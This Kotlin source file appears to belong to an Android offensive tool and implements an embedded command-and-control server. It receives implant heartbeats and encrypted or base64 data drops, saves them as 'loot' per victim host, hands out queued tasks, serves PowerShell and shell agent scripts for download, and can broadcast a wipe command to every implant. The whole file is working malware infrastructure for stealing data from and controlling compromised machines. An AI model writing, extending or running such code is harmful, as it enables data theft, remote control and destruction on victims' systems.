package com.projectzerodays.quantumcli.c2

import android.util.Base64
import com.projectzerodays.quantumcli.ops.Net
import fi.iki.elonen.NanoHTTPD
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException

/**
 * Embedded C2 server (NanoHTTPD) — full REST parity with the Python script:
 *
 *   GET  /dash             dashboard HTML (QUANTUMDASH)
 *   GET  /dash/api/state   {decisions, audit, mitre, killswitch}
 *   POST /r                implant beacons (hb / posix drop / encrypted drop)
 *   POST /kill             arm/disarm kill-switch (wipe task on every implant)
 *   GET  /s/<profile>      OBSIDIAN ps1 + GHOSTFANG sh agent scripts
 *   POST /ai               QCLI_API command dispatcher
 */
class C2Server(
    port: Int,
    private val api: QcliApi,
) : NanoHTTPD(port) {

    override fun serve(session: IHTTPSession): Response {
        val uri = session.uri ?: "/"
        val method = session.method

        if (method == Method.OPTIONS) {
            return cors(newFixedLengthResponse(Response.Status.OK, "text/plain", ""))
        }

        val resp = when {
            method == Method.GET && (uri == "/dash" || uri == "/dash/" || uri == "/dash/index.html") ->
                newFixedLengthResponse(Response.Status.OK, "text/html", DashHtml.HTML)

            method == Method.GET && uri == "/dash/api/state" ->
                json(C2State.dashState().toString())

            method == Method.POST && uri == "/r" ->
                handleBeacon(session)

            method == Method.POST && uri == "/kill" ->
                handleKill(session)

            method == Method.GET && (uri == "/s" || uri.startsWith("/s/")) ->
                handleAgent(uri.removePrefix("/s").removePrefix("/"))

            method == Method.POST && uri == "/ai" ->
                handleAi(session)

            method == Method.GET && (uri == "/" || uri == "/index.html") ->
                json(
                    JSONObject()
                        .put("ok", true)
                        .put("version", C2State.VERSION)
                        .put("dashboard", "/dash")
                        .put("endpoints", JSONArray(listOf("/dash", "/dash/api/state", "/r", "/kill", "/s/<profile>", "/ai")))
                        .toString()
                )

            uri == "/favicon.ico" ->
                newFixedLengthResponse(Response.Status.NO_CONTENT, "text/plain", "")

            else -> newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "not found")
        }
        return cors(resp)
    }

    // ------------------------------------------------------------------ /r
    private fun handleBeacon(session: IHTTPSession): Response {
        val d = jsonBody(session) ?: JSONObject()
        val host = d.optString("host", "?").ifBlank { "?" }
        val task = C2State.pullTask(host)
        val none = JSONObject().put("act", "none")

        // posix drop (plain base64 data, no envelope key)
        if (d.optString("data").isNotBlank() && d.optString("k").isBlank()) {
            val dir = File(C2State.lootDir, host).apply { mkdirs() }
            val fn = File(dir, "posix_drop_${System.currentTimeMillis() / 1000}.txt")
            val bytes = try {
                Base64.decode(d.optString("data"), Base64.DEFAULT)
            } catch (e: Exception) {
                d.optString("data").toByteArray(Charsets.UTF_8)
            }
            fn.writeBytes(bytes)
            val sealed = Grayfish.seal(fn)
            C2State.recordLoot(host, sealed, "posix-drop", bytes.size)
            C2State.audit("C2", "posix loot $host -> ${sealed.name}.gfy")
            return json((task ?: none).toString())
        }

        // heartbeat
        if (d.optString("act") == "hb") {
            C2State.enroll(host, d.optString("os").ifBlank { null })
            C2State.audit("C2", "hb $host; reply ${task?.toString() ?: "none"}")
            return json((task ?: none).toString())
        }

        // encrypted beacon (RSA-OAEP wrapped AES + gzip)
        val blob = BeaconCrypto.decryptBeacon(d)
        if (blob == null) {
            C2State.audit("ERR", "decrypt fail $host; replying none")
            return json(none.toString())
        }
        val dir = File(C2State.lootDir, host).apply { mkdirs() }
        val fn = File(dir, "drop_${System.currentTimeMillis() / 1000}.zip")
        fn.writeBytes(blob)
        val sealed = Grayfish.seal(fn)
        C2State.recordLoot(host, sealed, "drop", blob.size)
        C2State.audit("C2", "loot $host: ${blob.size} bytes -> ${sealed.name}")
        return json((task ?: none).toString())
    }

    // ------------------------------------------------------------------ /kill
    private fun handleKill(session: IHTTPSession): Response {
        val d = jsonBody(session) ?: JSONObject()
        val arm = d.optBoolean("arm", true)
        return if (arm) {
            val killed = C2State.killAll(d.optBoolean("wipe", true))
            json(JSONObject().put("killed", JSONArray(killed)).toString())
        } else {
            C2State.disarmKillswitch()
            json(JSONObject().put("killed", JSONArray()).put("note", "kill-switch disarmed").toString())
        }
    }

    // ------------------------------------------------------------------ /s
    private fun handleAgent(profile: String): Response {
        val c2 = "${Net.localIp()}:${QuantServerManager.boundPort}"
        val agent = Agents.profile(profile, c2)
            ?: return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "unknown profile")
        val (fileName, text) = agent
        C2State.audit("C2", "agent served: /s/$profile ($fileName)")
        return newFixedLengthResponse(Response.Status.OK, "text/plain; charset=utf-8", text)
    }

    // ------------------------------------------------------------------ /ai
    private fun handleAi(session: IHTTPSession): Response {
        val d = jsonBody(session) ?: JSONObject()
        val cmd = d.optString("cmd", "")
        val params = d.optJSONObject("params") ?: JSONObject()
        val out = api.handle(cmd, params)
        return json(out.toString())
    }

    // ------------------------------------------------------------------ util
    private fun jsonBody(session: IHTTPSession): JSONObject? {
        return try {
            val files = HashMap<String, String>()
            session.parseBody(files)
            val raw = files["postData"]
            if (raw.isNullOrBlank()) JSONObject() else JSONObject(raw)
        } catch (e: Exception) {
            try {
                JSONObject()
            } catch (e2: Exception) {
                null
            }
        }
    }

    private fun json(text: String): Response =
        newFixedLengthResponse(Response.Status.OK, "application/json", text)

    private fun cors(r: Response): Response {
        r.addHeader("Access-Control-Allow-Origin", "*")
        r.addHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        r.addHeader("Access-Control-Allow-Headers", "Content-Type, Authorization")
        return r
    }
}

/** Start/stop + status for the embedded server. */
object QuantServerManager {

    @Volatile
    var boundPort: Int = 8443
        private set

    private var server: C2Server? = null

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()

    fun start(port: Int): Boolean {
        stop()
        return try {
            BeaconCrypto.ensureKeys()
            val s = C2Server(port, QcliApi())
            s.start(NanoHTTPD.SOCKET_READ_TIMEOUT, true)
            server = s
            boundPort = port
            _running.value = true
            C2State.audit("C2", "QUANTUMDASH live at http://0.0.0.0:$port/dash")
            true
        } catch (e: IOException) {
            C2State.audit("ERR", "C2 bind :$port failed — ${e.message}")
            false
        } catch (e: Exception) {
            C2State.audit("ERR", "C2 start failed — ${e.message}")
            false
        }
    }

    fun stop() {
        server?.stop()
        server = null
        if (_running.value) {
            C2State.audit("C2", "C2 server stopped")
        }
        _running.value = false
    }

    fun restartIfRunning(newPort: Int): Boolean {
        val was = _running.value
        if (!was) return false
        return start(newPort)
    }
}
